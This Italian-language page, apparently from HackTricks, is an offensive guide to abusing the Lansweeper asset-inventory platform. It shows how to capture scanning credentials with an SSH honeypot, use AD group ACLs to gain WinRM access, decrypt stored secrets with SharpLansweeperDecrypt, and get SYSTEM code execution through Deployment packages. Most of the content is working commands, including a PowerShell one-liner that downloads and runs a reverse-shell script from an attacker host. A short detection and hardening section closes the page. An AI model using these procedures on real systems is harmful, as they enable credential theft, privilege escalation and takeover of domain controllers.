# Lansweeper Abuse: Credential Harvesting, Decrittazione dei Segreti e RCE tramite Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper è una piattaforma per la discovery e l'inventario degli asset IT, comunemente distribuita su Windows e integrata con Active Directory. Le credenziali configurate in Lansweeper vengono utilizzate dai suoi motori di scansione per autenticarsi agli asset tramite protocolli come SSH, SMB/WMI e WinRM. Le configurazioni errate consentono frequentemente:

- L'intercettazione delle credenziali reindirizzando un target di scansione verso un host controllato dall'attaccante (honeypot)
- L'abuso degli ACL di AD esposti dai gruppi correlati a Lansweeper per ottenere l'accesso remoto
- La decrittazione on-host dei segreti configurati in Lansweeper (stringhe di connessione e credenziali di scansione archiviate)
- L'esecuzione di codice sugli endpoint gestiti tramite la funzionalità Deployment (spesso eseguita come SYSTEM)

Questa pagina riassume i workflow e i comandi pratici utilizzati dagli attaccanti per sfruttare questi comportamenti durante gli engagement.

## 1) Harvest delle credenziali di scansione tramite honeypot (esempio SSH)

Idea: creare un Scanning Target che punti al proprio host e associargli le Scanning Credentials esistenti. Quando viene eseguita la scansione, Lansweeper tenterà di autenticarsi con tali credenziali e il proprio honeypot le acquisirà.<sup>[[1]](#references)</sup>

Panoramica dei passaggi (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (o Single IP) = il proprio IP VPN
- Configurare la porta SSH su un valore raggiungibile (ad esempio 2022 se la 22 è bloccata)
- Disabilitare la pianificazione e prevedere l'attivazione manuale
- Scanning → Scanning Credentials → assicurarsi che esistano credenziali Linux/SSH; associarle al nuovo target (abilitare tutte quelle necessarie)
- Fare clic su “Scan now” sul target
- Eseguire un honeypot SSH e recuperare username/password utilizzati nel tentativo

Esempio con sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Convalida le credenziali acquisite sui servizi del DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Note
- Funziona in modo simile con altri protocolli quando puoi indurre lo scanner a connettersi al tuo listener (honeypot SMB/WinRM, ecc.). SSH è spesso l’opzione più semplice.
- Molti scanner si identificano con banner client distinti (ad es. RebexSSH) e tenteranno di eseguire comandi innocui (uname, whoami, ecc.).

## 2) Abuso degli ACL di AD: ottieni l’accesso remoto aggiungendoti a un gruppo app-admin

Usa BloodHound per enumerare i diritti effettivi dell’account compromesso. Un risultato comune è un gruppo specifico dello scanner o dell’app (ad es. “Lansweeper Discovery”) con GenericAll su un gruppo privilegiato (ad es. “Lansweeper Admins”). Se il gruppo privilegiato è anche membro di “Remote Management Users”, WinRM diventa disponibile una volta che ci aggiungiamo.<sup>[[1]](#references)[[5]](#references)</sup>

Esempi di raccolta:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Sfruttare GenericAll su un gruppo con BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Quindi ottieni una shell interattiva:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Suggerimento: le operazioni Kerberos sono sensibili all'orario. Se riscontri KRB_AP_ERR_SKEW, sincronizzati prima con il DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrittografare i secrets configurati da Lansweeper sull'host

Sul server Lansweeper, il sito ASP.NET archivia generalmente una stringa di connessione crittografata e una chiave simmetrica utilizzata dall'applicazione. Con un accesso locale appropriato, è possibile decrittografare la stringa di connessione al DB ed estrarre quindi le credenziali di scansione archiviate.<sup>[[1]](#references)</sup>

Posizioni tipiche:
- Configurazione web: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Chiave dell'applicazione: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Utilizza SharpLansweeperDecrypt per automatizzare la decrittografia e il dumping delle credenziali archiviate:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
L'output previsto include i dettagli di connessione al DB e le credenziali di scansione in chiaro, come gli account Windows e Linux utilizzati nell'intera infrastruttura. Spesso questi account dispongono di privilegi locali elevati sugli host del dominio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Usa le credenziali di scansione Windows recuperate per l'accesso privilegiato:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

In qualità di membro di “Lansweeper Admins”, la web UI espone Deployment e Configuration. In Deployment → Deployment packages, è possibile creare pacchetti che eseguono comandi arbitrari sugli asset target. L'esecuzione viene effettuata dal servizio Lansweeper con privilegi elevati, ottenendo code execution come NT AUTHORITY\SYSTEM sull'host selezionato.<sup>[[1]](#references)</sup>

Passaggi di alto livello:
- Creare un nuovo Deployment package che esegua un one-liner PowerShell o cmd (reverse shell, add-user, ecc.).
- Selezionare come target l'asset desiderato (ad esempio il DC/host su cui è in esecuzione Lansweeper) e fare clic su Deploy/Run now.
- Ottenere la shell come SYSTEM.

Payload di esempio (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Le azioni di Deployment sono rumorose e lasciano log in Lansweeper e nei log degli eventi di Windows. Usale con giudizio.

## Rilevamento e hardening

- Limita o rimuovi le enumerazioni SMB anonime. Monitora il RID cycling e gli accessi anomali alle share di Lansweeper.
- Controlli egress: blocca o limita strettamente SSH/SMB/WinRM in uscita dagli host scanner. Genera alert sulle porte non standard (ad esempio, 2022) e sui client banner insoliti come Rebex.
- Proteggi `Website\\web.config` e `Key\\Encryption.txt`. Esternalizza i secret in un vault e ruotali in caso di leak. Valuta l'uso di service account con privilegi minimi e di gMSA quando possibile.
- Monitoraggio AD: genera alert sulle modifiche ai gruppi correlati a Lansweeper (ad esempio, “Lansweeper Admins”, “Remote Management Users”) e sulle modifiche ACL che concedono GenericAll/Write membership a gruppi privilegiati.
- Verifica le creazioni/modifiche/esecuzioni dei pacchetti Deployment; genera alert sui pacchetti che avviano cmd.exe/powershell.exe o connessioni in uscita impreviste.

## Argomenti correlati
- Enumerazione SMB/LSA/SAMR e RID cycling
- Password spraying Kerberos e considerazioni sul clock skew
- Analisi dei percorsi BloodHound dei gruppi application-admin
- Uso di WinRM e lateral movement

## Riferimenti
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
